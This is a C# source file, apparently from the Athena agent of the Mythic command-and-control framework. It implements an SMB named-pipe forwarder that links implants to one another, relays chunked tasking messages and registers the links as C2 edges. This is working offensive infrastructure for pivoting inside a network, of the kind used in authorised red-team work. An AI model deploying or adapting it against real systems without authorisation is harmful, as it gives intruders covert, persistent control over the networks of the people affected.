using Athena.Commands;
using Athena.Models.Comms.SMB;
using Athena.Models.Config;
using Athena.Models.Mythic.Tasks;
using Athena.Models.Responses;
using Athena.Utilities;
using H.Pipes;
using H.Pipes.Args;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Text;
using System.Text.Json;

namespace Athena.Forwarders
{
    public class SMBForwarder : IForwarder
    {
        public bool connected { get; set; }
        public string id { get; set; }
        private string agent_id { get; set; }
        private string linked_agent_id { get; set; }
        public string profile_type => "smb";
        private AutoResetEvent messageSuccess = new AutoResetEvent(false);
        private ConcurrentDictionary<string, StringBuilder> partialMessages = new ConcurrentDictionary<string, StringBuilder>();
        private PipeClient<SmbMessage> clientPipe { get; set; }
        public SMBForwarder(string id, string agent_id)
        {
            this.id = id;
            this.agent_id = agent_id;
        }

        public async Task<EdgeResponseResult> Link(MythicJob job, string uuid)
        {
            Dictionary<string, string> par = JsonSerializer.Deserialize<Dictionary<string, string>>(job.task.parameters);

            try
            {
                if (this.clientPipe is null || !this.connected)
                {
                    this.clientPipe = new PipeClient<SmbMessage>(par["pipename"], par["hostname"]);
                    this.clientPipe.MessageReceived += (o, args) => OnMessageReceive(args);
                    this.clientPipe.Connected += (o, args) => this.connected = true;
                    this.clientPipe.Disconnected += (o, args) => this.connected = false;
                    await clientPipe.ConnectAsync();

                    if (clientPipe.IsConnected)
                    {
                        Debug.WriteLine($"[{DateTime.Now}] Established link with agent.");
                        this.connected = true;

                        //Wait for the agent to give us its UUID
                        messageSuccess.WaitOne();

                        return new EdgeResponseResult()
                        {
                            task_id = job.task.id,
                            //user_output = $"Established link with pipe.\r\n{this.agent_id} -> {this.linked_agent_id}",
                            process_response = new Dictionary<string, string> { { "message", "0x14" } },
                            completed = true,
                            edges = new List<Edge>()
                            {
                                new Edge()
                                {
                                    destination = this.linked_agent_id,
                                    source = this.agent_id,
                                    action = "add",
                                    c2_profile = "smb",
                                    metadata = String.Empty
                                }
                            }
                        };
                    }
                }
            }
            catch (Exception e)
            {
                Debug.WriteLine($"[{DateTime.Now}] Error in link: {e}");
                return new EdgeResponseResult()
                {
                    task_id = job.task.id,
                    user_output = e.ToString(),
                    completed = true,
                    edges = new List<Edge>()
                    {
                        new Edge()
                        {
                            destination = this.linked_agent_id,
                            source = this.agent_id,
                            action = "add",
                            c2_profile = "smb"
                        }
                    }
                };
            }

            return new EdgeResponseResult()
            {
                task_id = job.task.id,
                process_response = new Dictionary<string, string> { { "message", "0x15" } },
                completed = true,
                edges = new List<Edge>()
                {
                    new Edge()
                    {
                        destination = this.linked_agent_id,
                        source = this.agent_id,
                        action = "add",
                        c2_profile = "smb"
                    }
                }
            };
        }
        public async Task<bool> ForwardDelegateMessage(DelegateMessage dm)
        {
            try
            {
                SmbMessage sm = new SmbMessage()
                {
                    guid = Guid.NewGuid().ToString(),
                    final = false,
                    message_type = "chunked_message"
                };

                IEnumerable<string> parts = dm.message.SplitByLength(4000);

                Debug.WriteLine($"[{DateTime.Now}] Sending message with size of {dm.message.Length} in {parts.Count()} chunks.");
                foreach (string part in parts)
                {
                    sm.delegate_message = part;

                    if (part == parts.Last())
                    {
                        sm.final = true;
                    }
                    Debug.WriteLine($"[{DateTime.Now}] Sending message to pipe: {part.Length} bytes. (Final = {sm.final})");
                    
                    await this.clientPipe.WriteAsync(sm);
                    
                    messageSuccess.WaitOne();
                }
                return true;
            }
            catch (Exception e)
            {
                Debug.WriteLine($"[{DateTime.Now}] Error in send: {e}");
                return false;
            }
        }
        //Unlink from the named pipe
        public async Task<bool> Unlink()
        {
            await this.clientPipe.DisconnectAsync();
            this.connected = false;
            await this.clientPipe.DisposeAsync();
            this.partialMessages.Clear();
            return true;
        }
        private async Task OnMessageReceive(ConnectionMessageEventArgs<SmbMessage> args)
        {
            Debug.WriteLine($"[{DateTime.Now}] Message received from pipe {args.Message.delegate_message.Length} bytes");
            try
            {
                switch (args.Message.message_type)
                {
                    case "success":
                        messageSuccess.Set();
                        break;
                    case "path_update": //This will be returned for new links to an existing agent.
                        this.linked_agent_id = args.Message.delegate_message;
                        messageSuccess.Set();
                        break;
                    case "new_path": //This will be returned for new links to an existing agent.
                        this.linked_agent_id = args.Message.delegate_message;
                        messageSuccess.Set();
                        break;
                    default: //This will be returned for checkin processes
                        {
                        this.partialMessages.TryAdd(args.Message.guid, new StringBuilder()); //Either Add the key or it already exists

                        this.partialMessages[args.Message.guid].Append(args.Message.delegate_message);

                        if (args.Message.final)
                        {
                            DelegateMessage dm = new DelegateMessage()
                            {
                                c2_profile = this.profile_type,
                                message = this.partialMessages[args.Message.guid].ToString(),
                                uuid = id,
                            };

                            await DelegateResponseHandler.AddDelegateMessageAsync(dm);
                            this.partialMessages.TryRemove(args.Message.guid, out _);
                        }
                        break;
                    }

                }
            }
            catch (Exception e)
            {
                Debug.WriteLine($"[{DateTime.Now}] Error in SMB Forwarder: {e}");
            }
        }
    }
}
